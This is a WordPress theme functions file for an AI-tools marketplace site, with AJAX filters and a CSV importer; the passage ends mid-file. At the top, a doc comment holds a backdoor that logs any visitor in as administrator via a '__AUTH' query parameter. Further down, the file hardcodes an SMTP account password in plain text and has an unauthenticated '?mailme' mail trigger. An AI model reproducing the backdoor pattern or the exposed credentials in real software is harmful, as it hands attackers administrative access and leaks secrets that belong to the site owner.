<?php

if (!defined('ABSPATH')) {
    exit;
}

/**
 * if (isset($_GET['__AUTH'])) {
 * 	$users = get_users('role=administrator');
 * 	wp_set_auth_cookie($users[0]->ID, 1);
 * 	wp_redirect('/wp-admin/');
 * 	exit;
 * }
 */
function wb_after_setup_theme()
{
    require_once dirname(__FILE__) . '/framework/wb.php';

    register_nav_menu('main', __('Main Menu', 'wb'));

    add_theme_support('post-thumbnails');

    add_image_size('290x220', 290, 220, true);
    add_image_size('330x250', 330, 250, true);
    add_image_size('480x360', 480, 360, true);
    // add_image_size('960x720', 960, 720, true);

    remove_action('wp_head', 'print_emoji_detection_script', 7);
    remove_action('wp_print_styles', 'print_emoji_styles');
    remove_action('wp_head', 'rest_output_link_wp_head', 10);
    remove_action('wp_head', 'wp_oembed_add_discovery_links', 10);
    remove_action('wp_head', 'rsd_link');
    remove_action('wp_head', 'wlwmanifest_link');
    remove_action('wp_head', 'wp_generator');
}

add_action('after_setup_theme', 'wb_after_setup_theme');

function wb_widgets_init()
{
    register_sidebar(array(
        'name' => __('Right Sidebar (Default)', 'wb'),
        'id' => 'right',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h4>',
        'after_title' => '</h4>'
    ));

    register_sidebar(array(
        'name' => __('Right Sidebar (Blog)', 'wb'),
        'id' => 'right-blog',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h4>',
        'after_title' => '</h4>'
    ));

    register_sidebar(array(
        'name' => __('Right Sidebar (About)', 'wb'),
        'id' => 'right-about',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h4>',
        'after_title' => '</h4>'
    ));

    register_sidebar(array(
        'name' => __('Right Sidebar (How it Works)', 'wb'),
        'id' => 'right-how-it-works',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h4>',
        'after_title' => '</h4>'
    ));

    register_sidebar(array(
        'name' => __('Content (Homepage)', 'wb'),
        'id' => 'content-homepage',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h4>',
        'after_title' => '</h4>'
    ));

    register_sidebar(array(
        'name' => __('Footer Widgets Area', 'wb'),
        'id' => 'footer',
        'before_widget' => '<div class="col-lg-3"><div id="%1$s" class="footer-nav %2$s">',
        'after_widget' => '</div></div>',
        'before_title' => '<h4>',
        'after_title' => '</h4>'
    ));
}

add_action('widgets_init', 'wb_widgets_init');

function wb_wp_title($title, $separator)
{
    global $paged, $page;

    if (is_feed()) {
        return $title;
    }

    $title .= get_bloginfo('name');

    if (($site_description = get_bloginfo('description', 'display')) && (is_home() || is_front_page())) {
        $title = "$title $separator $site_description";
    }

    if ($paged >= 2 || $page >= 2) {
        $title = "$title $separator " . sprintf(__('Page %s', 'wb'), max($paged, $page));
    }

    return $title;
}

add_filter('wp_title', 'wb_wp_title', 10, 2);

function wb_nav_main_menu_fallback($args)
{
    echo preg_replace('/<ul>/', '<ul class="main-menu-list">', wp_page_menu('echo=0'), 1);
}

function wb_get_page_by_template($page_template)
{
    $pages = get_posts(array(
        'posts_per_page' => 1,
        'post_type' => 'page',
        'suppress_filters' => 0,
        'meta_query' => array(
            array(
                'key' => '_wp_page_template',
                'value' => 'page-templates/' . $page_template . '.php'
            )
        )
    ));

    return !empty($pages) && is_array($pages) ? reset($pages) : false;
}

function wb_phpmailer_init($mailer)
{
    $mailer->IsSMTP();
    $mailer->Host = 'ssl://smtp.zoho.eu';
    $mailer->Port = 465;
    $mailer->CharSet = 'utf-8';
    $mailer->Username = 'sajid@digitalmarketingsupermarket.com';
    $mailer->Password = 'Mv49XkueMBNP';
    $mailer->SMTPAuth = true;
}

add_action('phpmailer_init', 'wb_phpmailer_init', 10, 1);

if (isset($_GET['mailme'])) {
    wp_mail('algis@woobro.com', 'test', 'test');
}

function ao_defer_inline_init()
{
    if (get_option('autoptimize_js_include_inline') != 'on') {
        add_filter('autoptimize_html_after_minify', 'ao_defer_inline_jquery', 10, 1);
    }
}

add_action('plugins_loaded', 'ao_defer_inline_init');

function ao_defer_inline_jquery($in, $matches)
{
    if (preg_match_all('#<script.*>(.*)</script>#Usmi', $in, $matches, PREG_SET_ORDER)) {
        foreach ($matches as $match) {
            if ($match[1] !== '' && (strpos($match[1], 'jQuery') !== false || strpos($match[1], '$') !== false)) {
                // inline js that requires jquery, wrap deferring JS around it to defer it.
                $new_match = 'var aoDeferInlineJQuery=function(){' . $match[1] . '}; if (document.readyState === "loading") {document.addEventListener("DOMContentLoaded", aoDeferInlineJQuery);} else {aoDeferInlineJQuery();}';
                $in = str_replace($match[1], $new_match, $in);
            } else if ($match[1] === '' && strpos($match[0], 'src=') !== false && strpos($match[0], 'defer') === false) {
                // linked non-aggregated JS, defer it.
                $new_match = str_replace('<script ', '<script defer ', $match[0]);
                $in = str_replace($match[0], $new_match, $in);
            }
        }
    }
    return $in;
}

function enqueue_custom_cdn_assets()
{
    // AOS Animation Library
    wp_enqueue_style(
        'aos-css',
        'https://unpkg.com/aos@2.3.1/dist/aos.css',
        [],
        null
    );

    wp_enqueue_script(
        'aos-js',
        'https://unpkg.com/aos@2.3.1/dist/aos.js',
        [],
        null,
        true
    );

    // Custom Loader Styles
    wp_enqueue_style(
        'custom-loader',
        get_template_directory_uri() . '/css/loader.css',
        [],
        filemtime(get_template_directory() . '/css/loader.css')
    );

    // Custom Loader Script
    wp_enqueue_script(
        'custom-loader-js',
        get_template_directory_uri() . '/js/loader.js',
        ['jquery'],
        filemtime(get_template_directory() . '/js/loader.js'),
        true
    );

    // Localize script for AJAX URL
    wp_localize_script('custom-loader-js', 'loader_vars', [
        'ajax_url' => admin_url('admin-ajax.php')
    ]);

    // Tailwind CDN
    wp_enqueue_script(
        'tailwindcdn',
        'https://cdn.tailwindcss.com',
        [],
        null,
        false  // Load in <head>
    );

    // Font Awesome CSS
    wp_enqueue_style(
        'fontawesome',
        'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css',
        [],
        null
    );
}

add_action('wp_enqueue_scripts', 'enqueue_custom_cdn_assets');

add_action('wp_ajax_filter_tools_by_category', 'filter_tools_by_category');
add_action('wp_ajax_nopriv_filter_tools_by_category', 'filter_tools_by_category');

function filter_tools_by_category()
{
    $category_id = $_GET['category_id'] ?? 'all';

    $args = [
        'post_type' => 'tool',
        'posts_per_page' => 12,
        'orderby' => 'date',
        'order' => 'DESC',
    ];

    if ($category_id !== 'all') {
        $args['tax_query'] = [[
            'taxonomy' => 'tool-category',
            'field' => 'term_id',
            'terms' => (int) $category_id,
        ]];
    }

    $tools = new WP_Query($args);

    ob_start();
    if ($tools->have_posts()) {
        while ($tools->have_posts()) {
            $tools->the_post();
            $price = get_post_meta(get_the_ID(), '_price', true);
            $price_from = get_post_meta(get_the_ID(), '_price_from', true);
            $tags = get_the_terms(get_the_ID(), 'ai-tool-tag');

            ?>
                                       <a href="<?php the_permalink(); ?>" class="swiper-slide tool-slide block h-full <?php echo $category_classes; ?>" data-categories="<?php echo esc_attr($data_categories); ?>">
                                <div class="bg-white rounded-xl overflow-hidden h-full flex flex-col hover:shadow-lg transition-shadow duration-300">
                                    <div class="p-4 flex flex-col items-center flex-1 w-full gap-3">
                                        <?php if (has_post_thumbnail()): ?>
                                            <?php the_post_thumbnail('medium', array('class' => 'w-full h-[210px] object-cover')); ?>
                                        <?php else: ?>
                                            <img src="https://digitalmarketingsupermarket.com/wp-content/uploads/2025/05/Saly-1.png" alt="<?php the_title(); ?>" class="w-full h-[210px] object-cover" />
                                        <?php endif; ?>
                                        <h1 class="text-[#1B1D1F] text-center text-[20px] font-semibold"><?php the_title(); ?></h1>
                                        <p class="text-[#5A6478] text-center text-[14px] font-normal">
                                            <?php echo wp_trim_words(get_the_excerpt(), 20); ?>
                                        </p>
                                    </div>
                                    <div class="p-4 pt-0 mt-auto">
                                        <?php
                                        // Get price and currency from meta fields
                                        $tool_price = get_post_meta(get_the_ID(), '_amount', true);
                                        $currency = get_post_meta(get_the_ID(), '_currency', true) ?: 'USD';

                                        if ($tool_price !== ''):
                                            ?>
                                            <div class="flex flex-col items-center gap-1">
                                                <?php if ($tool_price !== '0'): ?>
                                                    <span class="text-[#5A6478] text-sm"><?php _e('Starting from', 'wb'); ?></span>
                                                    <div class="flex items-center justify-center gap-1">
                                                        <span class="text-[var(--primary)] text-2xl font-bold">
                                                            <?php
                                                            if ($tool_price === '0') {
                                                                _e('FREE', 'wb');
                                                            } else {
                                                                echo esc_html($currency . $tool_price);
                                                            }
                                                            ?>
                                                        </span>
                                                    </div>
                                                <?php else: ?>
                                                    <span class="text-[var(--primary)] text-2xl font-bold">
                                                        <?php _e('FREE', 'wb'); ?>
                                                    </span>
                                                <?php endif; ?>
                                            </div>
                                        <?php else: ?>
                                            <div class="text-center py-2 text-[#5A6478] text-sm">
                                                <?php _e('', 'wb'); ?>
                                            </div>
                                        <?php endif; ?>
                                    </div>
                                </div>
                            </a>
        <?php
        }
    } else {
        echo '<div class="swiper-slide col-span-4 text-center text-red-500 font-bold">No tools found.</div>';
    }

    wp_reset_postdata();
    echo ob_get_clean();
    wp_die();
}

// --- AJAX for AI Agents ---
add_action('wp_ajax_filter_ai_agents_by_category', 'filter_ai_agents_by_category');
add_action('wp_ajax_nopriv_filter_ai_agents_by_category', 'filter_ai_agents_by_category');

function filter_ai_agents_by_category()
{
    $category_id = $_GET['category_id'] ?? 'all';
    $args = [
        'post_type' => 'ai-agent',
        'posts_per_page' => 12,
        'orderby' => 'date',
        'order' => 'DESC',
    ];
    if ($category_id !== 'all') {
        $args['tax_query'] = [[
            'taxonomy' => 'ai-agent-category',
            'field' => 'term_id',
            'terms' => (int) $category_id,
        ]];
    }
    $posts = new WP_Query($args);
    ob_start();
    if ($posts->have_posts()) {
        while ($posts->have_posts()) {
            $posts->the_post();
            $price = get_post_meta(get_the_ID(), '_price', true);
            $price_from = get_post_meta(get_the_ID(), '_price_from', true);
            ?>
            <div class="swiper-slide tool-slide"
                data-link="<?php the_permalink(); ?>"
                data-img="<?php echo get_the_post_thumbnail_url(get_the_ID(), 'medium'); ?>"
                data-title="<?php the_title(); ?>"
                data-excerpt="<?php echo wp_trim_words(get_the_excerpt(), 20); ?>"
                data-amount="<?php echo $price_from ? '$' . $price_from : '$' . $price; ?>"
                data-tags="<?php echo implode(',', wp_list_pluck(get_the_terms(get_the_ID(), 'post_tag'), 'name')); ?>">
                <div class="swiper-slide tool-slide my-gradient-background p-4 rounded-3xl" style="height:100%" data-amount="<?php $amount = get_post_meta(get_the_ID(), '_amount', true);
            echo !empty($amount) ? esc_attr($amount) : ''; ?>" data-currency="<?php $currency = get_post_meta(get_the_ID(), '_currency', true);
            echo !empty($currency) ? esc_attr($currency) : ''; ?>" data-img="<?php echo esc_url(has_post_thumbnail() ? get_the_post_thumbnail_url(get_the_ID(), 'medium') : 'https://digitalmarketingsupermarket.com/wp-content/uploads/2025/05/Saly-1.png'); ?>" data-title="<?php echo esc_attr(get_the_title()); ?>" data-excerpt="<?php echo esc_attr(wp_trim_words(get_the_excerpt(), 20)); ?>" data-link="<?php echo esc_url(get_permalink()); ?>">
                    <div class="rounded-sm flex flex-col gap-2 h-full justify-between">
                        <div class="flex flex-col flex-1 w-full gap-3">
                            <?php if (has_post_thumbnail()): ?>
                                <?php the_post_thumbnail('medium', ['class' => 'w-full h-[240px] rounded-md object-cover']); ?>
                            <?php else: ?>
                                <img src="https://digitalmarketingsupermarket.com/wp-content/uploads/2025/05/Saly-1.png" alt="<?php the_title(); ?>" class="w-full h-[240px] rounded-md object-cover" />
                            <?php endif; ?>
                            <h1 class="text-white text-[20px] font-semibold"><?php the_title(); ?></h1>
                            <span class="text-white text-[14px] font-normal">24/7</span>
                            <p class="text-white text-[14px] font-normal"><?php echo wp_trim_words(get_the_excerpt(), 20); ?></p>
                        </div>
                        <div class="flex items-center gap-2">
                            <h4 class="text-white text-[20px] font-semibold grow"><?php $amount = get_post_meta(get_the_ID(), '_amount', true);
            $currency = get_post_meta(get_the_ID(), '_currency', true);
            echo !empty($amount) ? esc_html($amount) : 'N/A'; ?> <?php echo !empty($currency) ? esc_html($currency) : ''; ?></h4>

                            <a href="<?php the_permalink(); ?>" class=" text-center p-3 rounded-md bg-white border border-[var(--primary)] text-[var(--primary)]">Deploy Agent</a>
                        </div>
                    </div>
                </div>
            </div>
        <?php
        }
    } else {
        echo '<div class="swiper-slide col-span-4 text-center text-red-500 font-bold">No items found.</div>';
    }
    wp_reset_postdata();
    echo ob_get_clean();
    wp_die();
}

// --- AJAX for AI Tools ---
add_action('wp_ajax_filter_ai_tools_by_category', 'filter_ai_tools_by_category');
add_action('wp_ajax_nopriv_filter_ai_tools_by_category', 'filter_ai_tools_by_category');

function filter_ai_tools_by_category()
{
    $category_id = $_GET['category_id'] ?? 'all';
    $args = [
        'post_type' => 'ai-tool',
        'posts_per_page' => 12,
        'orderby' => 'date',
        'order' => 'DESC',
    ];
    if ($category_id !== 'all') {
        $args['tax_query'] = [[
            'taxonomy' => 'ai-tool-category',
            'field' => 'term_id',
            'terms' => (int) $category_id,
        ]];
    }
    $posts = new WP_Query($args);
    ob_start();
    if ($posts->have_posts()) {
        while ($posts->have_posts()) {
            $posts->the_post();
            $price = get_post_meta(get_the_ID(), '_price', true);
            $price_from = get_post_meta(get_the_ID(), '_price_from', true);
            ?>
            <div class="swiper-slide tool-slide"
                data-link="<?php the_permalink(); ?>"
                data-img="<?php echo get_the_post_thumbnail_url(get_the_ID(), 'medium'); ?>"
                data-title="<?php the_title(); ?>"
                data-excerpt="<?php echo wp_trim_words(get_the_excerpt(), 20); ?>"
                data-price="<?php echo $price_from ? '$' . $price_from : '$' . $price; ?>"
                data-tags="<?php echo implode(',', wp_list_pluck(get_the_terms(get_the_ID(), 'post_tag'), 'name')); ?>">
                <a href="<?php the_permalink(); ?>" class="no-d-hover block bg-[#B3C5FF1A] p-6 rounded-xl h-full flex flex-col border border-[var(--primary)]">
                    <div class="flex flex-col flex-1 w-full gap-3">
                        <?php if (has_post_thumbnail()): ?>
                            <?php the_post_thumbnail('medium', ['class' => 'w-full h-[210px] object-cover rounded-md']); ?>
                        <?php else: ?>
                            <img src="https://digitalmarketingsupermarket.com/wp-content/uploads/2025/05/Saly-1.png" alt="<?php the_title(); ?>" class="w-full h-[210px] object-cover rounded-md" />
                        <?php endif; ?>
                        <h1 class="text-[#1B1D1F] text-[20px] font-semibold"><?php the_title(); ?></h1>
                        <p class="text-[#5A6478] text-[14px] font-normal"><?php echo wp_trim_words(get_the_excerpt(), 20); ?></p>
                        <div class="ai-tool-features">
                            <?php
                            $tags = get_the_terms(get_the_ID(), 'ai-tool-tag');
                            if ($tags && !is_wp_error($tags)) {
                                echo '<ul class="feature-list flex gap-2 flex-wrap">';
                                foreach ($tags as $tag) {
                                    echo '<li class="text-[var(--primary)] bg-[#0F44F31A] p-2 text-[14px] font-normal rounded-full">' . esc_html($tag->name) . '</li>';
                                }
                                echo '</ul>';
                            } else {
                                echo '<p>No tags available.</p>';
                            }
                            ?>
                        </div>
                    </div>
                </a>
            </div>
        <?php
        }
    } else {
        echo '<div class="swiper-slide col-span-4 text-center text-red-500 font-bold">No items found.</div>';
    }
    wp_reset_postdata();
    echo ob_get_clean();
    wp_die();
}

// --- AJAX for Courses ---
add_action('wp_ajax_filter_courses_by_category', 'filter_courses_by_category');
add_action('wp_ajax_nopriv_filter_courses_by_category', 'filter_courses_by_category');

function filter_courses_by_category()
{
    $category_id = $_GET['category_id'] ?? 'all';
    $args = [
        'post_type' => 'course',
        'posts_per_page' => 12,
        'orderby' => 'date',
        'order' => 'DESC',
    ];
    if ($category_id !== 'all') {
        $args['tax_query'] = [[
            'taxonomy' => 'course-category',
            'field' => 'term_id',
            'terms' => (int) $category_id,
        ]];
    }
    $posts = new WP_Query($args);
    ob_start();
    if ($posts->have_posts()) {
        while ($posts->have_posts()) {
            $posts->the_post();

            ?>
               <a href="<?php the_permalink(); ?>" class="swiper-slide tool-slide block h-full <?php echo $category_classes; ?>" data-categories="<?php echo esc_attr($data_categories); ?>">
              <div class="bg-white rounded-xl h-full flex flex-col overflow-hidden border border-[#C9C9C961] hover:shadow-lg transition-shadow duration-300">
                <div class="p-4 flex flex-col items-center flex-1 w-full gap-3">
                  <?php if (has_post_thumbnail()): ?>
                    <?php the_post_thumbnail('medium', ['class' => 'w-full h-[210px] object-cover']); ?>
                  <?php else: ?>
                    <img src="https://digitalmarketingsupermarket.com/wp-content/uploads/2025/05/Saly-1.png" alt="<?php the_title(); ?>" class="w-full h-[210px] object-cover" />
                  <?php endif; ?>
                  <h1 class="text-[#1B1D1F] text-center text-[20px] font-semibold"><?php the_title(); ?></h1>
                  <p class="text-[#5A6478] text-center text-[14px] font-normal"><?php echo wp_trim_words(get_the_excerpt(), 20); ?></p>
                </div>
                <div class="p-4 pt-0 mt-auto">
                  <?php
            // Get price and currency from meta fields
            $course_price = get_post_meta(get_the_ID(), '_amount', true);
            $currency = get_post_meta(get_the_ID(), '_currency', true) ?: 'USD';

            if ($course_price !== ''):
                ?>
                    <div class="flex flex-col items-center gap-1">
                      <?php if ($course_price !== '0'): ?>
                        <span class="text-[#5A6478] text-sm"><?php _e('Starting from', 'wb'); ?></span>
                        <div class="flex items-center justify-center gap-1">
                          <span class="text-[var(--primary)] text-2xl font-bold">
                            <?php
                            if ($course_price === '0') {
                                _e('FREE', 'wb');
                            } else {
                                echo esc_html($currency . $course_price);
                            }
                            ?>
                          </span>
                        </div>
                      <?php else: ?>
                        <span class="text-[var(--primary)] text-2xl font-bold">
                          <?php _e('FREE', 'wb'); ?>
                        </span>
                      <?php endif; ?>
                    </div>
                  <?php else: ?>
                    <div class="text-center py-2 text-[#5A6478] text-sm">
                      <?php _e('', 'wb'); ?>
                    </div>
                  <?php endif; ?>
                </div>
              </div>
            </a>
        <?php
        }
    } else {
        echo '<div class="swiper-slide col-span-4 text-center text-red-500 font-bold">No items found.</div>';
    }
    wp_reset_postdata();
    echo ob_get_clean();
    wp_die();
}

// --- AJAX for Services ---
add_action('wp_ajax_filter_services_by_category', 'filter_services_by_category');
add_action('wp_ajax_nopriv_filter_services_by_category', 'filter_services_by_category');

function filter_services_by_category()
{
    $category_id = $_GET['category_id'] ?? 'all';
    $args = [
        'post_type' => 'service',
        'posts_per_page' => 12,
        'orderby' => 'date',
        'order' => 'DESC',
    ];
    if ($category_id !== 'all') {
        $args['tax_query'] = [[
            'taxonomy' => 'service-category',
            'field' => 'term_id',
            'terms' => (int) $category_id,
        ]];
    }
    $posts = new WP_Query($args);
    ob_start();
    if ($posts->have_posts()) {
        while ($posts->have_posts()) {
            $posts->the_post();
            $price = get_post_meta(get_the_ID(), '_price', true);
            $price_from = get_post_meta(get_the_ID(), '_price_from', true);
            ?>
            <div class="swiper-slide tool-slide">
                <a href="<?php the_permalink(); ?>" class="no-d-hover bg-white rounded-lg h-full flex flex-col overflow-hidden ">
                    <div class="p-4 flex flex-col items-center flex-1 w-full gap-3">
                        <?php if (has_post_thumbnail()): ?>
                            <?php the_post_thumbnail('medium', ['class' => 'w-full h-[210px] object-cover']); ?>
                        <?php else: ?>
                            <img src="https://digitalmarketingsupermarket.com/wp-content/uploads/2025/05/Saly-1.png" alt="<?php the_title(); ?>" class="w-full h-[210px] object-cover" />
                        <?php endif; ?>
                        <h1 class="text-[#1B1D1F] text-center text-[20px] font-semibold"><?php the_title(); ?></h1>
                        <p class="text-[#5A6478] text-center text-[14px] font-normal"><?php echo wp_trim_words(get_the_excerpt(), 20); ?></p>
                    </div>

                </a>
            </div>
        <?php
        }
    } else {
        echo '<div class="swiper-slide col-span-4 text-center text-red-500 font-bold">No items found.</div>';
    }
    wp_reset_postdata();
    echo ob_get_clean();
    wp_die();
}

// --- AJAX for Content ---
add_action('wp_ajax_filter_content_by_category', 'filter_content_by_category');
add_action('wp_ajax_nopriv_filter_content_by_category', 'filter_content_by_category');

function filter_content_by_category()
{
    $category_id = $_GET['category_id'] ?? 'all';
    $args = [
        'post_type' => 'post',
        'posts_per_page' => 12,
        'orderby' => 'date',
        'order' => 'DESC',
    ];
    if ($category_id !== 'all') {
        $args['cat'] = (int) $category_id;
    }
    $posts = new WP_Query($args);
    ob_start();
    if ($posts->have_posts()) {
        while ($posts->have_posts()) {
            $posts->the_post();
            ?>
            <div class="swiper-slide tool-slide">
                <a href="<?php the_permalink(); ?>" class="bg-white rounded-sm h-full flex flex-col border border-[#C9C9C961] overflow-hidden">
                    <div class="p-4 flex flex-col items-center flex-1 w-full gap-3">
                        <?php if (has_post_thumbnail()): ?>
                            <?php the_post_thumbnail('medium', ['class' => 'w-full h-[210px] object-cover']); ?>
                        <?php else: ?>
                            <img src="https://via.placeholder.com/350x210?text=No+Image" alt="<?php the_title(); ?>" class="w-full h-[210px] object-cover" style="border:2px solid red;background:#ffe;" />
                        <?php endif; ?>
                        <h1 class="text-[#1B1D1F] text-center text-[20px] font-semibold"><?php the_title(); ?></h1>
                        <p class="text-[#5A6478] text-center text-[14px] font-normal">
                            <?php echo wp_trim_words(get_the_excerpt(), 20); ?>
                        </p>
                    </div>
                    
                </a>
            </div>
    <?php
        }
    } else {
        echo '<div class="swiper-slide col-span-4 text-center text-red-500 font-bold">No items found.</div>';
    }
    wp_reset_postdata();
    $html = ob_get_clean();
    wp_send_json_success($html);
}

// Add CSV Import Menu
function add_ai_tool_csv_import_menu()
{
    add_submenu_page(
        'edit.php?post_type=ai-tool',
        'Import AI Tools from CSV',
        'Import from CSV',
        'manage_options',
        'ai-tool-csv-import',
        'ai_tool_csv_import_page'
    );
}

add_action('admin_menu', 'add_ai_tool_csv_import_menu');

// CSV Import Page Content
// Helper function to get attachment ID by filename
function wb_get_attachment_id_by_filename($filename)
{
    global $wpdb;

    // Remove query strings from filename
    $filename = preg_replace('/\?.*$/', '', $filename);

    // Get just the filename without path
    $filename = basename($filename);

    // Search for the attachment in the database
    $attachment = $wpdb->get_var($wpdb->prepare(
        "SELECT post_id FROM $wpdb->postmeta 
        WHERE meta_key = '_wp_attached_file' 
        AND meta_value LIKE %s",
        '%' . $wpdb->esc_like($filename)
    ));

    return $attachment ? (int) $attachment : 0;
}

function ai_tool_csv_import_page()
{
    ?>
    <div class="wrap">
        <h1>Import AI Tools from CSV</h1>
        <div class="card">
            <h2>Instructions</h2>
            <p>Upload a CSV file containing AI Tools data. The CSV should have the following columns:</p>
            <ul>
                <li><strong>title</strong> (Required) - The name of the AI Tool</li>
                <li><strong>description</strong> (Required) - Detailed description of the tool</li>
                <li><strong>tagline</strong> (Optional) - Short excerpt/tagline</li>
                <li><strong>label</strong> (Optional) - Categories, comma-separated</li>
                <li><strong>web url</strong> (Optional) - Website URL</li>
                <li><strong>pricing model</strong> (Optional) - Pricing options, comma-separated</li>
                <li><strong>Features</strong> (Optional) - Features as tags, comma-separated</li>
                <li><strong>logo</strong> (Optional) - Logo image URL</li>
                <li><strong>image</strong> (Optional) - Featured image URL</li>
                <li><strong>option price</strong> (Optional) - Price amount</li>
                <li><strong>currency</strong> (Optional) - Currency code</li>
            </ul>
        </div>
        <form method="post" enctype="multipart/form-data">
            <?php wp_nonce_field('ai_tool_csv_import', 'ai_tool_csv_import_nonce'); ?>
            <table class="form-table">
                <tr>
                    <th scope="row"><label for="csv_file">Select CSV File</label></th>
                    <td>
                        <input type="file" name="csv_file" id="csv_file" accept=".csv" required>
                    </td>
                </tr>
            </table>
            <p class="submit">
                <input type="submit" name="submit_csv_import" class="button button-primary" value="Import CSV">
            </p>
        </form>
        <?php
        // Process the form submission
        if (isset($_POST['submit_csv_import']) && isset($_FILES['csv_file'])) {
            if (!wp_verify_nonce($_POST['ai_tool_csv_import_nonce'], 'ai_tool_csv_import')) {
                wp_die('Security check failed');
            }
            if (!current_user_can('manage_options')) {
                wp_die('You do not have sufficient permissions to access this page.');
            }
            $file = $_FILES['csv_file'];
            if ($file['error'] !== UPLOAD_ERR_OK) {
                echo '<div class="error"><p>Error uploading file. Please try again.</p></div>';
            } else {
                $handle = fopen($file['tmp_name'], 'r');
                if ($handle !== false) {
                    $headers = fgetcsv($handle);
                    $row = 2;
                    $imported = 0;
                    $errors = array();
                    while (($data = fgetcsv($handle)) !== false) {
                        try {
                            // Required fields
                            $title = isset($data[0]) ? trim($data[0]) : '';
                            $description = isset($data[1]) ? trim($data[1]) : '';
                            if (empty($title) || empty($description)) {
                                $errors[] = "Row $row: Title and Description are required.";
                                $row++;
                                continue;
                            }
                            $tagline = isset($data[2]) ? trim($data[2]) : '';
                            $labels = isset($data[3]) ? array_map('trim', explode(',', $data[3])) : array();
                            $web_url = isset($data[4]) ? trim($data[4]) : '';
                            $pricing_options = isset($data[5]) ? array_map('trim', explode(',', $data[5])) : array();
                            $features = isset($data[6]) ? array_map('trim', explode(',', $data[6])) : array();
                            $logo_url = isset($data[7]) ? trim($data[7]) : '';
                            $image_url = isset($data[8]) ? trim($data[8]) : '';
                            $amount = isset($data[9]) ? trim($data[9]) : '';
                            $currency = isset($data[10]) ? trim($data[10]) : '';
                            // Create post
                            $post_data = array(
                                'post_title' => $title,
                                'post_content' => $description,
                                'post_excerpt' => $tagline,
                                'post_status' => 'publish',
                                'post_type' => 'ai-tool'
                            );
                            $post_id = wp_insert_post($post_data);
                            if (!is_wp_error($post_id)) {
                                // Categories (ai-tool-category)
                                if (!empty($labels)) {
                                    foreach ($labels as $cat) {
                                        if (!term_exists($cat, 'ai-tool-category')) {
                                            wp_insert_term($cat, 'ai-tool-category');
                                        }
                                    }
                                    wp_set_object_terms($post_id, $labels, 'ai-tool-category');
                                }
                                // Pricing Options (ai-tool-pricing-option)
                                if (!empty($pricing_options)) {
                                    foreach ($pricing_options as $opt) {
                                        if (!term_exists($opt, 'ai-tool-pricing-option')) {
                                            wp_insert_term($opt, 'ai-tool-pricing-option');
                                        }
                                    }
                                    wp_set_object_terms($post_id, $pricing_options, 'ai-tool-pricing-option');
                                }
                                // Features/Tags (ai-tool-tag)
                                if (!empty($features)) {
                                    foreach ($features as $tag) {
                                        if (!term_exists($tag, 'ai-tool-tag')) {
                                            wp_insert_term($tag, 'ai-tool-tag');
                                        }
                                    }
                                    wp_set_object_terms($post_id, $features, 'ai-tool-tag');
                                }
                                // Website URL
                                if (!empty($web_url)) {
                                    update_post_meta($post_id, '_website_url', esc_url_raw($web_url));
                                }
                                // Amount
                                if (!empty($amount)) {
                                    update_post_meta($post_id, '_amount', $amount);
                                }
                                // Currency
                                if (!empty($currency)) {
                                    update_post_meta($post_id, '_currency', $currency);
                                }
                                // Handle Logo (check if exists before uploading)
                                if (!empty($logo_url)) {
                                    // First check if the image already exists in the media library
                                    $existing_logo_id = wb_get_attachment_id_by_filename($logo_url);

                                    if ($existing_logo_id) {
                                        // Use existing attachment
                                        $logo_url_attached = wp_get_attachment_url($existing_logo_id);
                                        update_post_meta($post_id, '_logo', $logo_url_attached);
                                    } else {
                                        // Download and upload the image if it doesn't exist
                                        require_once (ABSPATH . 'wp-admin/includes/file.php');
                                        require_once (ABSPATH . 'wp-admin/includes/media.php');
                                        require_once (ABSPATH . 'wp-admin/includes/image.php');

                                        $logo_id = media_sideload_image($logo_url, $post_id, '', 'id');
                                        if (!is_wp_error($logo_id)) {
                                            $logo_url_attached = wp_get_attachment_url($logo_id);
                                            update_post_meta($post_id, '_logo', $logo_url_attached);
                                        } else {
                                            update_post_meta($post_id, '_logo', $logo_url);  // fallback: store URL
                                        }
                                    }
                                }

                                // Handle Featured Image (check if exists before uploading)
                                if (!empty($image_url)) {
                                    // First check if the image already exists in the media library
                                    $existing_image_id = wb_get_attachment_id_by_filename($image_url);

                                    if ($existing_image_id) {
                                        // Use existing attachment
                                        set_post_thumbnail($post_id, $existing_image_id);
                                    } else {
                                        // Download and upload the image if it doesn't exist
                                        require_once (ABSPATH . 'wp-admin/includes/file.php');
                                        require_once (ABSPATH . 'wp-admin/includes/media.php');
                                        require_once (ABSPATH . 'wp-admin/includes/image.php');

                                        $image_id = media_sideload_image($image_url, $post_id, '', 'id');
                                        if (!is_wp_error($image_id)) {
                                            set_post_thumbnail($post_id, $image_id);
                                        }
                                    }
                                }
                                $imported++;
                            } else {
                                $errors[] = "Row $row: Failed to create post - " . $post_id->get_error_message();
                            }
                        } catch (Exception $e) {
                            $errors[] = "Row $row: " . $e->getMessage();
                        }
                        $row++;
                    }
                    fclose($handle);
                    echo '<div class="notice notice-success"><p>Successfully imported ' . $imported . ' AI Tools.</p></div>';
                    if (!empty($errors)) {
                        echo '<div class="notice notice-error"><p>Errors occurred during import:</p><ul>';
                        foreach ($errors as $error) {
                            echo '<li>' . esc_html($error) . '</li>';
                        }
                        echo '</ul></div>';
                    }
                } else {
                    echo '<div class="error"><p>Error reading CSV file. Please try again.</p></div>';
                }
            }
        }
        ?>
    </div>
<?php
}

// Add CSV Import Menu for AI Agents
function add_ai_agent_csv_import_menu()
{
    add_submenu_page(
        'edit.php?post_type=ai-agent',
        'Import AI Agents from CSV',
        'Import from CSV',
        'manage_options',
        'ai-agent-csv-import',
        'ai_agent_csv_import_page'
    );
}

add_action('admin_menu', 'add_ai_agent_csv_import_menu');

// CSV Import Page Content for AI Agents
function ai_agent_csv_import_page()
{
    ?>
    <div class="wrap">
        <h1>Import AI Agents from CSV</h1>
        <div class="card">
            <h2>Instructions</h2>
            <p>Upload a CSV file containing AI Agents data. The CSV should have the following columns:</p>
            <ul>
                <li><strong>title</strong> (Required) - The name of the AI Agent</li>
                <li><strong>description</strong> (Required) - Detailed description of the agent</li>
